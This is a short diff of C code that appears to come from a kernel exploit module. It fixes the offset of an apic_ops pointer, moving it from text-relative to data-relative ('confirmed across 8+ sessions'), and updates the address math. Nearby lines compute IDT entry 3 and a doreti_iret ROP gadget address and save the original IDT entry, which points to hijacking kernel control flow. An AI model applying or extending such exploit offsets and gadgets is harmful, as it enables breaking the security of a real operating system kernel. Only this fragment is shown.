@@ -38,8 +38,8 @@
 #define OFF_IDT          0x64cdc80
 #define IDT_ENTRY_SIZE   16
 
-/* ktext-relative offset */
-#define OFF_APIC_OPS     0x1934AC8
+/* kdata-relative offset (confirmed across 8+ sessions) */
+#define OFF_APIC_OPS     0x1656B0
 
 /* Gadget offsets (relative to kdata_base, negative = ktext) */
 #define OFF_DORETI_IRET  (-0x9cf84c)
@@ -254,7 +254,7 @@ int module_start(kproc_args *args)
     /* Compute addresses */
     uint64_t idt_base = kdata_base + OFF_IDT;
     uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
-    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
+    uint64_t apic_ops_addr = kdata_base + OFF_APIC_OPS;
     uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
 
     /* Save original IDT[3] for restoration */
